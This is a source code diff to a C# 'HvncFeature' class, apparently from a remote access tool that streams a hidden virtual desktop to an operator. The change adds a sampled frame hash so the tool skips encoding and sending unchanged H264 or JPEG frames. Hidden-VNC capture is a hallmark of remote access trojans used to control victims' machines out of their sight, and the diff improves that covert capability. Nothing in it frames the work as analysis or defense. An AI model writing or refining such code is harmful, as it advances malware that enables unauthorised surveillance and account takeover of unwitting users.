@@ -336,6 +336,10 @@ internal static class HvncFeature
     // H264 encoder — null when unavailable (falls back to JPEG)
     private static H264Encoder? _h264Enc;
 
+    // Dirty-frame detection — skip encode+send when composite is unchanged
+    private static ulong _lastCompHash;
+    private static bool  _compositeUnchanged;
+
 
     // ── Public API ────────────────────────────────────────────────────────────
 
@@ -560,25 +564,44 @@ internal static class HvncFeature
                         // H264 path: capture composite, encode via MF H264 encoder
                         if (CaptureComposite() && _compBits != 0)
                         {
-                            var h264 = _h264Enc.Encode(_compBits, _canvasW * 4);
-                            if (h264 != null)
+                            if (_compositeUnchanged && !inDrag)
                             {
-                                // Manual JSON — avoids JsonSerializer internal buffers + frame object alloc
-                                _send?.Invoke((int)PacketType.HvncH264Frame,
-                                    "{\"W\":" + _canvasW + ",\"H\":" + _canvasH + ",\"D\":\"" + Convert.ToBase64String(h264) + "\"}");
+                                // No change — return the ack budget and wait one frame before re-checking
+                                Interlocked.Increment(ref _pendingAcks);
+                                Thread.Sleep(_fpsDelay);
                             }
-                            else { Interlocked.Increment(ref _pendingAcks); Thread.Sleep(50); }
+                            else
+                            {
+                                var h264 = _h264Enc.Encode(_compBits, _canvasW * 4);
+                                if (h264 != null)
+                                {
+                                    // Manual JSON — avoids JsonSerializer internal buffers + frame object alloc
+                                    _send?.Invoke((int)PacketType.HvncH264Frame,
+                                        "{\"W\":" + _canvasW + ",\"H\":" + _canvasH + ",\"D\":\"" + Convert.ToBase64String(h264) + "\"}");
+                                }
+                                else { Interlocked.Increment(ref _pendingAcks); Thread.Sleep(50); }
+                            }
                         }
                         else { Interlocked.Increment(ref _pendingAcks); Thread.Sleep(50); }
                     }
                     else
                     {
                         // JPEG path (fallback)
-                        var jpeg = CaptureFrame();
-                        if (jpeg != null)
+                        if (CaptureComposite() && _compBits != 0)
                         {
-                            _send?.Invoke((int)PacketType.HvncFrame,
-                                "{\"W\":" + _canvasW + ",\"H\":" + _canvasH + ",\"J\":\"" + Convert.ToBase64String(jpeg) + "\"}");
+                            if (_compositeUnchanged && !inDrag)
+                            {
+                                Interlocked.Increment(ref _pendingAcks);
+                                Thread.Sleep(_fpsDelay);
+                            }
+                            else
+                            {
+                                var jpeg = EncodeJpeg(_compBits, _canvasW, _canvasH, _canvasW * 4);
+                                if (jpeg != null)
+                                    _send?.Invoke((int)PacketType.HvncFrame,
+                                        "{\"W\":" + _canvasW + ",\"H\":" + _canvasH + ",\"J\":\"" + Convert.ToBase64String(jpeg) + "\"}");
+                                else { Interlocked.Increment(ref _pendingAcks); Thread.Sleep(50); }
+                            }
                         }
                         else { Interlocked.Increment(ref _pendingAcks); Thread.Sleep(50); }
                     }
@@ -674,7 +697,21 @@ internal static class HvncFeature
         if (hArrow != 0 && _curX >= 0 && _curY >= 0 && _curX < w && _curY < h)
             DrawIconEx(_compHdc, _curX, _curY, hArrow, 0, 0, 0, 0, 3 /*DI_NORMAL*/);
 
+        ulong hash = CompHash((byte*)_compBits, w, h);
+        _compositeUnchanged = hash == _lastCompHash;
+        _lastCompHash = hash;
         return true;
+    }
+
+    // Sample every 32nd 8-byte chunk — ~32K iterations at 1080p, negligible cost
+    private static unsafe ulong CompHash(byte* bits, int w, int h)
+    {
+        ulong h64 = 0;
+        ulong* p  = (ulong*)bits;
+        int    n  = w * h / 2; // total 8-byte units
+        for (int i = 0; i < n; i += 32)
+            h64 ^= p[i];
+        return h64;
     }
 
     // JPEG path — captures composite and encodes to JPEG bytes.
@@ -706,6 +743,7 @@ internal static class HvncFeature
         if (_compHbm != 0) { DeleteObject(_compHbm); _compHbm = 0; }
         if (_compHdc != 0) { DeleteDC(_compHdc);     _compHdc = 0; }
         _compBits = 0; _compW = 0; _compH = 0;
+        _lastCompHash = 0; // force dirty on next frame after recreation
     }
 
     // ── Window cache ──────────────────────────────────────────────────────────
